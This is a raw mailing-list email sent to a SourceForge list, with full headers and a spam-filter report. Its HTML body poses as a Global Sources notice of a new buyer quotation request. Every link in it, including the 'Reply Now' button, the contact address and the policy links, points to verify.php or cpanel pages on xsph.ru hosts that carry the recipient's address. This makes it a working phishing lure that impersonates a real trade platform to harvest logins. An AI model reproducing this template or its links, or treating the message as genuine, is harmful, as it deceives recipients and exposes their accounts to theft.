Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id D902B4EE372
	for <lists+osst-users@lfdr.de>; Thu, 31 Mar 2022 23:47:34 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1na2di-0000c3-UB
	for lists+osst-users@lfdr.de; Thu, 31 Mar 2022 21:47:33 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <noreply@message.globalsources.com>)
 id 1na2dg-0000bv-Pa
 for osst-users@lists.sourceforge.net; Thu, 31 Mar 2022 21:47:31 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=t4Q8Cb6wJ+r45P/WWyxstBzqH7Tyrhn+UzoR4IsfrAE=; b=BhOYQOLBGqNzlEw/Yyr7ZcebXD
 HCANmhy6E7mkLCRjbNU1JPGH+efNL0ug9BvV7mg7MiFTsFnILsp6pf6XqLeGfNOG2ZqtPaPT82RDY
 1oszv7o4WyFXO8KHmL+fOvqgTwRBqn/Y0KVyhXeLRVRZVDU2/M76D5p0dSY3GD9cduJM=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=t4Q8Cb6wJ+r45P/WWyxstBzqH7Tyrhn+UzoR4IsfrAE=; b=Y
 9c4Q1Mo58Uji/h5ksYcqfNcoGHPvRg4MBf5+NWTBrhSZmPYI1Oo3CB16zS9hWA85SXGsCnuoC0SEo
 arEcthNgpMX/X2gaOtfE9+NfU3Ma7eSI4W4isx6PN4UV2Exe429rAkfjtBpFxAer5KR/zmpl3Bmkm
 gjBSv4qrZsp837i0=;
Received: from [81.12.6.236] (helo=mail.lar-co.ir)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps (TLS1:AES128-SHA:128)
 (Exim 4.94.2) id 1na2dd-0013fm-My
 for osst-users@lists.sourceforge.net; Thu, 31 Mar 2022 21:47:31 +0000
Received: from message.globalsources.com (196.50.5.129) by mail.lar-co.ir
 (81.12.6.236) with Microsoft SMTP Server id 14.3.123.3; Fri, 1 Apr 2022
 02:17:21 +0430
To: <osst-users@lists.sourceforge.net>
Date: Thu, 31 Mar 2022 22:47:19 +0100
Message-ID: <20220331224714.8E638763AA34532F@message.globalsources.com>
MIME-Version: 1.0
X-Spam-Score: 5.8 (+++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Untitled Document Inquiry Details Dear
 osst-users@lists.sourceforge.net, 
 Content analysis details:   (5.8 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [81.12.6.236 listed in dnsbl-1.uceprotect.net]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 1.3 RCVD_IN_VALIDITY_RPBL  RBL: Relay in Validity RPBL,
 https://senderscore.org/blocklistlookup/
 [81.12.6.236 listed in bl.score.senderscore.com]
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
 1.1 HTML_FONT_TINY_NORDNS  Font too small to read, no rDNS
X-Headers-End: 1na2dd-0013fm-My
Subject: [Osst-users] New quotation for request #(76803)
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
From: Global Sources via Osst-users <osst-users@lists.sourceforge.net>
Reply-To: Global Sources <noreply@message.globalsources.com>
Content-Type: multipart/mixed; boundary="===============8612058764568203787=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============8612058764568203787==
Content-Type: multipart/related;
	boundary="----=_NextPart_000_0012_AF4A8075.2B92E6D9"

------=_NextPart_000_0012_AF4A8075.2B92E6D9
Content-Type: text/html; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.=
w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<HTML xmlns=3D"http://www.w3.org/1999/xhtml"><HEAD><TITLE>Untitled Document=
</TITLE>
<META content=3D"text/html; charset=3Diso-8859-1" http-equiv=3DContent-Type=
>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<body>
<table style=3D"FONT-SIZE: small; FONT-FAMILY: Helvetica, &quot;Microsoft Y=
ahei&quot;, verdana; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM=
: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS=
: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(238,238,238);=
 -webkit-text-stroke-width: 0px; font-variant-ligatures: normal; font-varia=
nt-caps: normal; text-decoration-style: initial; text-decoration-color: ini=
tial; text-decoration-thickness: initial" cellspacing=3D"0" cellpadding=3D"=
1" width=3D"780" align=3D"center">
<TBODY>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" valign=3D"top" width=3D"780">
<table cellspacing=3D"0" cellpadding=3D"0" width=3D"778" align=3D"center" b=
order=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" align=3D"center">
<table cellspacing=3D"0" cellpadding=3D"0" width=3D"150" align=3D"center" b=
order=3D"0">
<TBODY></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" valign=3D"top">
<table cellspacing=3D"0" cellpadding=3D"0" width=3D"778" border=3D"0">
<TBODY>
<TR bgColor=3D#ffffff>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" valign=3D"top" width=3D"778" align=3D"center"></TD></TR>
<TR bgColor=3D#ffffff>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" valign=3D"top" width=3D"770" align=3D"center">
<table cellspacing=3D"0" cellpadding=3D"0" width=3D"95%" align=3D"center" b=
order=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" height=3D"20"></TD></TR>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; BORDER-BOTTOM: red 2p=
x solid; MARGIN: 0px; LINE-HEIGHT: 1.666" align=3D"left"><FONT size=3D3><im=
g style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; BORDER-BOTTOM-W=
IDTH: 0px; BORDER-TOP-WIDTH: 0px" alt=3D"global sources logo" src=3D"cid:eg=
logo.jpg" width=3D"145" height=3D"22">
<BR></FONT><SPAN style=3D"FONT-SIZE: 16px; FONT-FAMILY: &#24494;&#36719;&#3=
8597;&#40657;, Helvetica, Arial; FONT-WEIGHT: 700; COLOR: rgb(45,45,45)">In=
quiry Details</SPAN><BR></TD></TR>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" height=3D"30"></TD></TR>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; FONT-WEIGHT: bolder; =
MARGIN: 0px; LINE-HEIGHT: 1.666" align=3D"center"><BR></TD></TR>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" height=3D"40"><SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Aria=
l, Helvetica, sans-serif"><BR></SPAN></TD></TR>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; PADDING-BOTTOM: 0px; =
PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.666; PADDI=
NG-RIGHT: 40px" align=3D"left"><FONT style=3D"FONT-SIZE: 14px" face=3D"Aria=
l, Helvetica, sans-serif">Dear osst-users@lists.sourceforge.net,<BR><BR></F=
ONT>
<table id=3D"m_-116186182723389543gmail-m_5013589259945692818m_137997022517=
4248363m_5618632461406376961m_-7618329610907796994m_35776196622809334m_-438=
9726099656423478m_408667408228455410m_-6949205847644131766m_-63474562658730=
18049m_8599041600297696877m_-7571182725678932323m_6912381451588337610m_4706=
594833111748297m_-6272800946688743883m_6173059526262161422m_-38125199614061=
22164m_9044761254241949826m_-5444960452108265218m_-1000836351922505025m_558=
6448802547813980m_-3705121170993268285m_-5580120339778649307" m_-2914346710=
88265109=3D"" style=3D"FONT-SIZE: 16px; FONT-FAMILY: Roboto, RobotoDraft, H=
elvetica, Arial, sans-serif; COLOR: rgb(51,51,51)" cellspacing=3D"0" cellpa=
dding=3D"0" width=3D"100%" border=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
; MARGIN: 0px; LINE-HEIGHT: 1.666" valign=3D"top" align=3D"left">
<table id=3D"m_-116186182723389543gmail-m_5013589259945692818m_137997022517=
4248363m_5618632461406376961m_-7618329610907796994m_35776196622809334m_-438=
9726099656423478m_408667408228455410m_-6949205847644131766m_-63474562658730=
18049m_8599041600297696877m_-7571182725678932323m_6912381451588337610m_4706=
594833111748297m_-6272800946688743883m_6173059526262161422m_-38125199614061=
22164m_9044761254241949826m_-5444960452108265218m_-1000836351922505025m_558=
6448802547813980m_-3705121170993268285m_-5580120339778649307" m_-2914346710=
88265109=3D"" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"=
0">
<TBODY>
<TR>
<td style=3D"BORDER-TOP: rgb(204,204,204) 1px solid; FONT-FAMILY: arial, ve=
rdana, sans-serif; BORDER-RIGHT: rgb(204,204,204) 1px solid; BACKGROUND: rg=
b(255,253,226); BORDER-BOTTOM: rgb(204,204,204) 1px solid; PADDING-BOTTOM: =
10px; PADDING-TOP: 10px; PADDING-LEFT: 10px; BORDER-LEFT: rgb(204,204,204) =
1px solid; MARGIN: 5px 0px 0px; LINE-HEIGHT: 1.666; PADDING-RIGHT: 10px" va=
lign=3D"top" align=3D"left">
&#22909;&#28040;&#24687;! &#24744;&#22312;<A style=3D"COLOR: rgb(0,150,255)=
; text-decoration-line: none" href=3D"http://a0652850.xsph.ru/globacore/Glo=
balSources/verify.php?email=3Dosst-users@lists.sourceforge.net" target=3D_b=
lank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://a0645697=
=2Exsph.ru/cpanel/GS/index.php?work%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmai=
l&amp;ust=3D1648844089963000&amp;usg=3DAOvVaw3XIlftMM8G81ScKJYrtyUr">&#2961=
5;&#29699;&#36164;&#28304;&#32593;&#31449;</A>
&nbsp;&#19978;&#25910;&#21040;&#20102;1&#23553;&#26469;&#33258;&#29615;&#29=
699;&#36164;&#28304;&#20080;&#23478;&#30340;&#26368;&#26032;RFQ (RFQ - Requ=
est for Quotation And Catalogue)&#12290;
<P></P>&#35831;&#28857;&#20987;&#19979;&#38754;&#30340;&#8220;&#31435;&#213=
63;&#22238;&#22797;&#8221;&#20197;&#22238;&#22797;&#24182;&#20139;&#21463;&=
#21830;&#26426;&#65281;</TD></TR>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; BORDER-BOTTOM: rgb(12=
8,128,128) 1px solid; MARGIN: 0px; LINE-HEIGHT: 1.666"></TD></TR></TBODY></=
TABLE>
<P></P></TD></TR>
<TR>
<td style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
; FONT-WEIGHT: bold; MARGIN: 0px; LINE-HEIGHT: 1.666" valign=3D"top" align=
=3D"left">&#20080;&#23478;&#35810;&#20215;<BR></TD></TR></TBODY></TABLE>
<table role=3D"presentation" style=3D"FONT-SIZE: 14px; FONT-FAMILY: ??, ari=
al, Verdana, sans-serif; BORDER-COLLAPSE: collapse; LINE-HEIGHT: 1.2" cells=
pacing=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-SIZE: 0px; FONT-FAMILY: Roboto, RobotoDraft, Helvetica, A=
rial, sans-serif; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" align=3D"left"=
>
<DIV style=3D"FONT-SIZE: 16px; FONT-FAMILY: &#24494;&#36719;&#38597;&#40657=
;, Helvetica, Arial; COLOR: rgb(102,102,102); LINE-HEIGHT: 1">
<P style=3D"COLOR: rgb(45,45,45); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
DDING-LEFT: 0px; MARGIN: 0px 0px 4px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px=
"><BR></P></DIV></TD></TR>
<TR>
<td style=3D"FONT-SIZE: 0px; FONT-FAMILY: Roboto, RobotoDraft, Helvetica, A=
rial, sans-serif; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-T=
OP: 16px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" align=3D"left=
">
<DIV style=3D"FONT-SIZE: 14px; FONT-FAMILY: &#24494;&#36719;&#38597;&#40657=
;, Helvetica, Arial; COLOR: rgb(45,45,45); LINE-HEIGHT: 1"></DIV></TD></TR>=

<TR>
<td style=3D"FONT-SIZE: 0px; FONT-FAMILY: Roboto, RobotoDraft, Helvetica, A=
rial, sans-serif; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-T=
OP: 16px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" align=3D"left=
">
<DIV style=3D"FONT-SIZE: 14px; FONT-FAMILY: &#24494;&#36719;&#38597;&#40657=
;, Helvetica, Arial; COLOR: rgb(45,45,45); LINE-HEIGHT: 1">We are looking t=
o buy your machine ,stainless steel, Battery and wire. Please send us your =
best quotation.</DIV></TD></TR>
<TR>
<td style=3D"FONT-SIZE: 0px; FONT-FAMILY: Roboto, RobotoDraft, Helvetica, A=
rial, sans-serif; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-T=
OP: 16px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" align=3D"left=
">
<DIV style=3D"FONT-SIZE: 14px; FONT-FAMILY: &#24494;&#36719;&#38597;&#40657=
;, Helvetica, Arial; COLOR: rgb(45,45,45); LINE-HEIGHT: 1"></DIV></TD></TR>=

<TR>
<td style=3D"FONT-SIZE: 0px; FONT-FAMILY: Roboto, RobotoDraft, Helvetica, A=
rial, sans-serif; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-T=
OP: 16px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" align=3D"left=
">
<DIV style=3D"FONT-SIZE: 14px; FONT-FAMILY: &#24494;&#36719;&#38597;&#40657=
;, Helvetica, Arial; COLOR: rgb(45,45,45); LINE-HEIGHT: 1"><BR></DIV></TD><=
/TR></TBODY></TABLE><FONT style=3D"FONT-SIZE: 14px" face=3D"Arial, Helvetic=
a, sans-serif"></FONT></TD></TR>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" height=3D"40"></TD></TR>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" valign=3D"top" align=3D"center">
<table height=3D"39" cellspacing=3D"0" cellpadding=3D"0" width=3D"230" alig=
n=3D"center" border=3D"0" valign=3D"middle">
<TBODY>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" bgcolor=3D"#00007d" height=3D"39" valign=3D"middle" align=3D"ce=
nter">
&nbsp;&nbsp;<A style=3D"COLOR: rgb(0,51,153); text-decoration-line: none" h=
ref=3D"http://a0652850.xsph.ru/globacore/GlobalSources/verify.php?email=3Do=
sst-users@lists.sourceforge.net" target=3D_blank data-saferedirecturl=3D"ht=
tps://www.google.com/url?q=3Dhttp://a0652850.xsph.ru/globacore/GlobalSource=
s/verify.php?email%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D16488=
44089963000&amp;usg=3DAOvVaw0bTgyqsqv_DzH3Se6m9bsT"><FONT color=3D#ffffff s=
ize=3D3 face=3D"Arial, Tahoma, sans-serif" type=3D"button"><B>
Reply Now&#65288;&#31435;&#21363;&#22238;&#22797;&#65289;</B></FONT></A></T=
D></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
<TR bgColor=3D#ffffff>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" valign=3D"top" width=3D"760" align=3D"left">
<table cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" align=3D"left" bo=
rder=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666">
<table cellspacing=3D"0" cellpadding=3D"0" width=3D"95%" align=3D"center" b=
order=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" height=3D"30"></TD></TR>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" width=3D"100%" align=3D"left"><FONT size=3D2 face=3D"Arial, Hel=
vetica, sans-serif">Wishing you the best of business,<BR><BR><B>The Global =
Sources Team</B><BR>
<A style=3D"COLOR: rgb(0,51,153)" href=3D"http://a0652850.xsph.ru/globacore=
/GlobalSources/verify.php?email=3Dosst-users@lists.sourceforge.net" target=
=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://a06=
45697.xsph.ru/cpanel/GS/index.php?work%3D%5B%5B-Email-%5D%5D&amp;source=3Dg=
mail&amp;ust=3D1648844089963000&amp;usg=3DAOvVaw3XIlftMM8G81ScKJYrtyUr">ser=
vice@globalsources.com</A><BR><BR></FONT><FONT size=3D2 face=3D"Arial, Helv=
etica, sans-serif">Global Sources<BR>
Find new products online at&nbsp;<A style=3D"COLOR: rgb(0,51,153); text-dec=
oration-line: none" href=3D"http://a0652850.xsph.ru/globacore/GlobalSources=
/verify.php?email=3Dosst-users@lists.sourceforge.net" target=3D_blank data-=
saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://a0652850.xsph.ru/g=
lobacore/GlobalSources/verify.php?email%3D%5B%5B-Email-%5D%5D&amp;source=3D=
gmail&amp;ust=3D1648844089963000&amp;usg=3DAOvVaw0bTgyqsqv_DzH3Se6m9bsT">Gl=
obalSources.com</A><BR>
Meet suppliers face-to-face at&nbsp;<A style=3D"COLOR: rgb(0,51,153); text-=
decoration-line: none" href=3D"http://a0652850.xsph.ru/globacore/GlobalSour=
ces/verify.php?email=3Dosst-users@lists.sourceforge.net" target=3D_blank da=
ta-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://a0652850.xsph.r=
u/globacore/GlobalSources/verify.php?email%3D%5B%5B-Email-%5D%5D&amp;source=
=3Dgmail&amp;ust=3D1648844089963000&amp;usg=3DAOvVaw0bTgyqsqv_DzH3Se6m9bsT"=
>GlobalSources.com/<WBR>Exhibitions</A></FONT></TD></TR>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" height=3D"10"></TD></TR></TBODY></TABLE></TD></TR></TBODY></TAB=
LE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
<table style=3D"FONT-SIZE: small; FONT-FAMILY: Helvetica, &quot;Microsoft Y=
ahei&quot;, verdana; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM=
: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS=
: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255);=
 -webkit-text-stroke-width: 0px; font-variant-ligatures: normal; font-varia=
nt-caps: normal; text-decoration-style: initial; text-decoration-color: ini=
tial; text-decoration-thickness: initial" cellspacing=3D"0" cellpadding=3D"=
0" width=3D"780" align=3D"center" bgcolor=3D"#ffffff" border=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666">
<table cellspacing=3D"0" cellpadding=3D"0" width=3D"730" align=3D"center" b=
order=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" height=3D"30"></TD></TR>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" valign=3D"middle" align=3D"center"><FONT color=3D#666666 size=
=3D1 face=3D"Verdana, Arial, sans-serif">
This e-mail was addressed to&nbsp;<A style=3D"COLOR: rgb(0,51,153)" href=3D=
"http://a0645697.xsph.ru/cpanel/GS/index.php?work=3Dosst-users@lists.source=
forge.net" target=3D_blank data-saferedirecturl=3D"https://www.google.com/u=
rl?q=3Dhttp://a0645697.xsph.ru/cpanel/GS/index.php?work%3D%5B%5B-Email-%5D%=
5D&amp;source=3Dgmail&amp;ust=3D1648844089963000&amp;usg=3DAOvVaw3XIlftMM8G=
81ScKJYrtyUr">osst-users@lists.sourceforge.net</A>
=2E To ensure delivery,&nbsp;<A style=3D"COLOR: rgb(0,51,153)" href=3D"http=
://a0645697.xsph.ru/cpanel/GS/index.php?work=3Dosst-users@lists.sourceforge=
=2Enet" target=3D_blank data-saferedirecturl=3D"https://www.google.com/url?=
q=3Dhttp://a0645697.xsph.ru/cpanel/GS/index.php?work%3D%5B%5B-Email-%5D%5D&=
amp;source=3Dgmail&amp;ust=3D1648844089963000&amp;usg=3DAOvVaw3XIlftMM8G81S=
cKJYrtyUr">&nbsp;Add us to your address book</A><BR>Global Sources, 30/F, 4=
1 Heung Yip Road, Wong Chuk Hang, Hong Kong SAR. Phone: (852) 8121-2000<BR>=

Email:&nbsp;<A style=3D"COLOR: rgb(0,51,153)" href=3D"http://a0652850.xsph.=
ru/globacore/GlobalSources/verify.php?email=3Dosst-users@lists.sourceforge.=
net" target=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=
=3Dhttp://a0645697.xsph.ru/cpanel/GS/index.php?work%3D%5B%5B-Email-%5D%5D&a=
mp;source=3Dgmail&amp;ust=3D1648844089963000&amp;usg=3DAOvVaw3XIlftMM8G81Sc=
KJYrtyUr">service@globalsources.<WBR>com</A></FONT></TD></TR></TBODY></TABL=
E></TD></TR>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" height=3D"10"></TD></TR>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; BORDER-BOTTOM: rgb(20=
4,204,204) 1px solid; PADDING-BOTTOM: 10px; MARGIN: 0px; LINE-HEIGHT: 1.666=
" align=3D"center"><FONT size=3D1 face=3D"Verdana, Arial, sans-serif">We ha=
ve updated our policies to comply with the EU's new General Data Protection=
 Regulation.<BR>
To find out more, please read the&nbsp;<A style=3D"COLOR: rgb(0,51,153)" hr=
ef=3D"http://a0645697.xsph.ru/cpanel/GS/index.php?work=3Dosst-users@lists.s=
ourceforge.net" target=3D_blank data-saferedirecturl=3D"https://www.google.=
com/url?q=3Dhttp://a0645697.xsph.ru/cpanel/GS/index.php?work%3D%5B%5B-Email=
-%5D%5D&amp;source=3Dgmail&amp;ust=3D1648844089963000&amp;usg=3DAOvVaw3XIlf=
tMM8G81ScKJYrtyUr">Privacy Policy</A>
&nbsp;&nbsp;and&nbsp;<A style=3D"COLOR: rgb(0,51,153)" href=3D"http://a0645=
697.xsph.ru/cpanel/GS/index.php?work=3Dosst-users@lists.sourceforge.net" ta=
rget=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp:/=
/a0645697.xsph.ru/cpanel/GS/index.php?work%3D%5B%5B-Email-%5D%5D&amp;source=
=3Dgmail&amp;ust=3D1648844089963000&amp;usg=3DAOvVaw3XIlftMM8G81ScKJYrtyUr"=
>Cookie Policy</A>&nbsp;on our website.</FONT></TD></TR>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" height=3D"5"></TD></TR>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" align=3D"center"><FONT size=3D1 face=3D"Verdana, sans-serif">
Copyright &copy; 2022 Publishers Representatives Limited.&nbsp;<A style=3D"=
COLOR: rgb(0,51,153); text-decoration-line: none" href=3D"http://a0645697.x=
sph.ru/cpanel/GS/index.php?work=3Dosst-users@lists.sourceforge.net" target=
=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://a06=
45697.xsph.ru/cpanel/GS/index.php?work%3D%5B%5B-Email-%5D%5D&amp;source=3Dg=
mail&amp;ust=3D1648844089963000&amp;usg=3DAOvVaw3XIlftMM8G81ScKJYrtyUr">All=
 rights reserved.</A></FONT></TD></TR>
<TR>
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; MARGIN: 0px; LINE-HEI=
GHT: 1.666" height=3D"8"></TD></TR></TBODY></TABLE>
<img style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 14px; FONT-FAMILY: Helveti=
ca, &quot;Microsoft Yahei&quot;, verdana; BORDER-RIGHT-WIDTH: 0px; WHITE-SP=
ACE: normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TRANSFORM: n=
one; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; W=
IDOWS: 2; LETTER-SPACING: normal; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: =
rgb(238,238,238); TEXT-INDENT: 0px; -webkit-text-stroke-width: 0px; font-va=
riant-ligatures: normal; font-variant-caps: normal;=20
text-decoration-style: initial; text-decoration-color: initial; text-decora=
tion-thickness: initial" border=3D"0" name=3D"m_-116186182723389543_m_-8448=
059737085033612_m_8684923132274989936_m_2022950729488698221_DCSIMG" src=3D"=
cid:njs.gif" width=3D"1" height=3D"1"><FONT style=3D"FONT-FAMILY: Arial, He=
lvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM=
: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS=
: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; -webkit-text-stro=
ke-width: 0px; font-variant-ligatures: normal; font-variant-caps: normal; t=
ext-decoration-style: initial; text-decoration-color: initial; text-decorat=
ion-thickness: initial" size=3D3>&nbsp;&nbsp;</FONT></BODY></HTML>
------=_NextPart_000_0012_AF4A8075.2B92E6D9
Content-Type: image/jpeg; name="eglogo.jpg"
Content-Transfer-Encoding: base64
Content-ID: <eglogo.jpg>

